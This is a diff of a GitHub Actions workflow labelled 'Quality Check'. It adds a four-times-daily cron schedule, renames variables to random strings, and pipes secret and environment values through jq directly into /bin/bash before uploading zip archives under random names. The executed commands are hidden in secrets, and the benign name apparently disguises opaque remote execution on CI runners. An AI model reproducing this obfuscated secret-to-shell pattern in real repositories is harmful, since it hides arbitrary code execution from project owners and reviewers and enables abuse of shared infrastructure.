@@ -2,6 +2,8 @@ name: Quality Check
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '24 1,7,13,19 * * *'
 jobs:
   service:
     runs-on: ubuntu-latest
@@ -10,15 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Run
         env:
-          los6: ${{ secrets.los6 }}
+          a97907: ${{ secrets.a97907 }}
         run: |
-          printf '%s' "$los6" | jq -r .asyu068 | /bin/bash
-          printf '%s' "$odd751" | jq -r .dla8223 | /bin/bash
-          echo $jtlz31242 | jq -r .vlz206 | /bin/bash
+          printf '%s' "$a97907" | jq -r .v1336 | /bin/bash
+          echo $ug19208 | jq -r .ap0 | /bin/bash
+          echo $zfbyy232 | jq -r .ojyhu037 | /bin/bash
+          printf '%s' "$goufz4405" | jq -r .m7 | /bin/bash
+          echo $dclxk39823 | jq -r .unos450 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
         with:
-          name: C77DqvJZ
+          name: xziSberN
           path: "*.zip"
           retention-days: 1
